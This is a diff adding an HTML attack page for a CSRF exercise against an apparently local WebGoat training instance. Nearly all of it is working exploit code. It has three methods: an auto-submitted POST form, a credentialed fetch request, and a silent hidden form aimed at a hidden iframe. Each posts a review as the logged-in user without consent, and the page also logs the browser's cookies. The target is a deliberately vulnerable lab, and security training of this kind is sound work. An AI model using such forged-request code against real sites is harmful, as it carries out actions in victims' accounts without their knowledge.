@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF - Post Review Attack</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: #333;
+            margin-top: 0;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 15px;
+        }
+        .alert {
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+            border-left: 5px solid;
+        }
+        .alert-info { background: #e3f2fd; border-color: #2196F3; color: #0d47a1; }
+        .alert-warning { background: #fff3e0; border-color: #ff9800; color: #e65100; }
+        .alert-success { background: #e8f5e9; border-color: #4caf50; color: #1b5e20; }
+        
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 10px 5px;
+            transition: all 0.3s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+        .form-group {
+            margin: 20px 0;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #333;
+        }
+        input, textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+            font-family: inherit;
+            box-sizing: border-box;
+        }
+        textarea {
+            min-height: 100px;
+            resize: vertical;
+        }
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        #result {
+            margin-top: 25px;
+            padding: 20px;
+            background: #f5f5f5;
+            border-radius: 8px;
+            display: none;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        code {
+            background: #e8eaf6;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            color: #5e35b1;
+        }
+        .method-box {
+            background: #f8f9fa;
+            padding: 20px;
+            margin: 15px 0;
+            border-radius: 8px;
+            border-left: 4px solid #667eea;
+        }
+        .method-box h3 {
+            margin-top: 0;
+            color: #667eea;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎯 CSRF - Post Review Attack</h1>
+        
+        <div class="alert alert-warning">
+            <strong>⚠️ IMPORTANT:</strong> You MUST be logged into WebGoat at 
+            <code>http://192.168.254.112:8001</code> in THIS SAME BROWSER!
+        </div>
+
+        <div class="alert alert-info">
+            <strong>📝 What This Does:</strong><br>
+            This page will submit a review on behalf of the logged-in user by exploiting
+            the CSRF vulnerability. The review will be posted without the user's explicit consent.
+        </div>
+
+        <h2>📝 Customize Your Review (Optional)</h2>
+        <div class="form-group">
+            <label for="stars">Stars (0-5):</label>
+            <input type="number" id="stars" min="0" max="5" value="5">
+        </div>
+        <div class="form-group">
+            <label for="message">Review Message:</label>
+            <textarea id="message">This review was posted via CSRF attack!</textarea>
+        </div>
+
+        <div class="method-box">
+            <h3>Method 1: Auto-Submit Form (Recommended)</h3>
+            <p>Click the button below to automatically submit the review:</p>
+            <button onclick="method1()">🚀 POST REVIEW VIA CSRF</button>
+        </div>
+
+        <div class="method-box">
+            <h3>Method 2: Fetch API with POST</h3>
+            <p>Uses JavaScript fetch to POST the review:</p>
+            <button onclick="method2()">📡 POST via Fetch API</button>
+        </div>
+
+        <div class="method-box">
+            <h3>Method 3: Hidden Form (Silent Attack)</h3>
+            <p>Creates and submits a hidden form automatically on page load:</p>
+            <button onclick="method3()">👻 Create Hidden Form</button>
+        </div>
+
+        <div id="result"></div>
+    </div>
+
+    <script>
+        // Common endpoints for CSRF review submission
+        const ENDPOINTS = [
+            'http://192.168.254.112:8001/WebGoat/csrf/review',
+            'http://192.168.254.112:8001/WebGoat/csrf/post-review',
+            'http://192.168.254.112:8001/WebGoat/CSRF/review',
+            'http://192.168.254.112:8001/WebGoat/csrf/feedback'
+        ];
+
+        const DEFAULT_ENDPOINT = ENDPOINTS[0];
+
+        function showResult(msg, success = false) {
+            const div = document.getElementById('result');
+            div.style.display = 'block';
+            div.style.background = success ? '#e8f5e9' : '#ffebee';
+            div.style.color = success ? '#1b5e20' : '#b71c1c';
+            div.textContent = msg;
+        }
+
+        function getFormData() {
+            return {
+                stars: document.getElementById('stars').value,
+                reviewText: document.getElementById('message').value
+            };
+        }
+
+        function method1() {
+            showResult('🔄 Creating and submitting form...');
+            
+            const data = getFormData();
+            
+            // Create a form element
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = DEFAULT_ENDPOINT;
+            form.target = '_blank'; // Open result in new window
+            
+            // Add stars field
+            const starsInput = document.createElement('input');
+            starsInput.type = 'hidden';
+            starsInput.name = 'stars';
+            starsInput.value = data.stars;
+            form.appendChild(starsInput);
+            
+            // Add review text field
+            const reviewInput = document.createElement('input');
+            reviewInput.type = 'hidden';
+            reviewInput.name = 'reviewText';
+            reviewInput.value = data.reviewText;
+            form.appendChild(reviewInput);
+            
+            // Also try 'review' as field name
+            const reviewInput2 = document.createElement('input');
+            reviewInput2.type = 'hidden';
+            reviewInput2.name = 'review';
+            reviewInput2.value = data.reviewText;
+            form.appendChild(reviewInput2);
+            
+            // Add to document and submit
+            document.body.appendChild(form);
+            form.submit();
+            
+            showResult('✅ Form submitted!\n\nCheck the new window for the result.\nThen go back to WebGoat to see if the review was posted.', true);
+            
+            // Clean up after a delay
+            setTimeout(() => form.remove(), 2000);
+        }
+
+        async function method2() {
+            showResult('🔄 Sending POST request via Fetch API...');
+            
+            const data = getFormData();
+            
+            try {
+                // Try URL-encoded form data
+                const formBody = new URLSearchParams({
+                    stars: data.stars,
+                    reviewText: data.reviewText,
+                    review: data.reviewText
+                });
+
+                console.log('Posting to:', DEFAULT_ENDPOINT);
+                console.log('Form data:', formBody.toString());
+                
+                const response = await fetch(DEFAULT_ENDPOINT, {
+                    method: 'POST',
+                    credentials: 'include',
+                    mode: 'cors',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    },
+                    body: formBody
+                });
+                
+                console.log('Response Status:', response.status);
+                
+                const text = await response.text();
+                console.log('Response Body:', text);
+                
+                if (response.ok) {
+                    showResult(`✅ SUCCESS!\n\nStatus: ${response.status}\n\nResponse:\n${text}\n\nCheck WebGoat to see if the review was posted!`, true);
+                    
+                    // Try to parse JSON
+                    try {
+                        const json = JSON.parse(text);
+                        if (json.lessonCompleted) {
+                            showResult(`🎉 LESSON COMPLETED!\n\n${JSON.stringify(json, null, 2)}`, true);
+                        }
+                    } catch (e) {
+                        // Not JSON, that's OK
+                    }
+                } else {
+                    showResult(`⚠️ Response Status: ${response.status}\n\nResponse:\n${text}\n\nThe request was sent but check WebGoat to see if it worked.`, true);
+                }
+                
+            } catch (error) {
+                console.error('Fetch Error:', error);
+                showResult(`❌ Error: ${error.message}\n\nThe endpoint might be different. Try Method 1 or Method 3.`, false);
+            }
+        }
+
+        function method3() {
+            showResult('👻 Creating hidden form that will auto-submit...');
+            
+            const data = getFormData();
+            
+            // Create a hidden iframe for silent submission
+            const iframe = document.createElement('iframe');
+            iframe.name = 'csrf-target';
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+            
+            // Create form targeting the iframe
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = DEFAULT_ENDPOINT;
+            form.target = 'csrf-target';
+            form.style.display = 'none';
+            
+            // Add fields
+            ['stars', 'reviewText', 'review'].forEach(fieldName => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = fieldName;
+                input.value = fieldName === 'stars' ? data.stars : data.reviewText;
+                form.appendChild(input);
+            });
+            
+            document.body.appendChild(form);
+            
+            // Submit after a brief delay
+            setTimeout(() => {
+                form.submit();
+                showResult('✅ Hidden form submitted silently!\n\nThe review should now be posted.\nCheck WebGoat to verify.', true);
+            }, 500);
+        }
+
+        // Log for debugging
+        console.log('CSRF Attack Page Loaded');
+        console.log('Default endpoint:', DEFAULT_ENDPOINT);
+        console.log('Current cookies:', document.cookie);
+    </script>
+</body>
+</html>
